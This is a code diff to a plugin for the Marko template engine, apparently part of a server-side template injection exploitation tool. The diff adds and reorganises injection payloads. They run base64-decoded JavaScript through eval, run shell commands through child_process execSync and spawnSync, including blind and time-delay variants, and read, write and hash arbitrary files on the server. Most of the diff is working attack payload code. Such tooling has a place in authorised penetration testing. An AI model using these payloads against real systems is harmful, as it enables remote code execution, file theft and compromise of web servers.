@@ -3,6 +3,7 @@ from utils import rand
 
 
 class Marko(javascript.Javascript):
+    generic_plugin = True
     priority = 5
     plugin_info = {
         "Description": """Marko template engine""",
@@ -25,6 +26,36 @@ class Marko(javascript.Javascript):
                 'test_render': f'${{typeof({rand.randints[0]})+{rand.randints[1]}}}',
                 'test_render_expected': f'number{rand.randints[1]}'
             },
+            'render_error': {
+                'header': """${{''['x'][({header[0]}+{header[1]}).toString()+""",
+                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]}}""",
+            },
+            'evaluate': {
+                'evaluate': """${{eval(Buffer('{code_b64p}', 'base64').toString())}}"""
+            },
+            'evaluate_error': {
+                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())"""
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """${{[""][0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]}}"""
+            },
+            'execute': {
+                'execute': """${{require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())}}"""
+            },
+            'execute_error': {
+                'execute': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
+            },
+            'execute_boolean': {
+                'call': 'evaluate_blind',
+                # spawnSync() shell option has been introduced in node 5.7, so this will not work with old node versions.
+                # TODO: use another function.
+                'execute_blind': """require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
+            },
+            'execute_blind': {
+                'call': 'inject',
+                'execute_blind': """${{require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')}}"""
+            },
             'write': {
                 'call': 'inject',
                 'write': """${{require('fs').appendFileSync('{path}',Buffer('{chunk_b64p}','base64'),'binary')}}""",
@@ -34,18 +65,14 @@ class Marko(javascript.Javascript):
                 'call': 'render',
                 'read': """${{require('fs').readFileSync('{path}').toString('base64')}}"""
             },
+            'read_error': {
+                'read': """require('fs').readFileSync('{path}').toString('base64')"""
+            },
             'md5': {
                 'md5': "${{require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')}}"
             },
-            'evaluate': {
-                'evaluate': """${{eval(Buffer('{code_b64p}', 'base64').toString())}}"""
-            },
-            'execute': {
-                'execute': """${{require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())}}"""
-            },
-            'execute_blind': {
-                'call': 'inject',
-                'execute_blind': """${{require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')}}"""
+            'md5_error': {
+                'md5': "require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')"
             },
         })
 
